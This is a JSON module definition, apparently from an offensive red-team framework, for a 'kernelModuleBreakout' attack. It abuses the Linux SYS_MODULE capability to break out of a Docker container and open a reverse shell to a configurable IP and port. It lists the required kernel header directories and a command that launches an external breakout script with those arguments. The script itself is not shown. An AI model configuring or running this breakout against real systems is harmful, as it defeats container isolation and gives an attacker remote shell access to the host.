{
  "base": {
    "name": "kernelModuleBreakout",
    "type": "standard",
    "author": ["Will Roberts @willrushi"],
    "credits": ["Will Roberts @willrushi , Nishant Sharma - https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd "],
    "path": ["linux", "shell", "kernelModuleBreakout.json"],
    "platform": "linux",
    "arch": "x64",
    "lang": "Shell",
    "privilege": false,
    "GoInterpreter": false,
    "GoInterpreterProgress": false,
    "LoadScriptFromPath": true,
    "notes": "Commands are run with /bin/bash -c . Use quotes if you want to run multiple commands or shell features such as redirection or pipeline",
    "remote": "",
    "local": [],
    "options": [
      {"name": "ip", "value": "127.0.0.1", "required": true, "flag": "", "description": "ip for the reverse shell"},
      {"name": "port", "value": "8000", "required": true, "flag": "", "description": "port for the reverse shell"}
    ],
    "description": "Abusing SYS_MODULE Capability to create reverse shell with the host\nThere is couple of directories you need in order to use insmod and insert a module into the kernel,depend on your linux kernel version (check $(uname -r))\nFor exmaple, version 5.11.0-37 you will need the following directories:\n/usr/src/linux-headers-5.11.0-37-generic\n/usr/src/linux-hwe-5.11-headers-5.11.0-37\n/lib/modules/5.11.0-37-generic ",
    "commands": [
      "data/modules/sourcecode/sh/kernelModuleBreakout/kernelModuleBreakout.sh",
      "sh",
      "-c",
      "\"{{ip}} {{port}}\""
    ]
  }
}

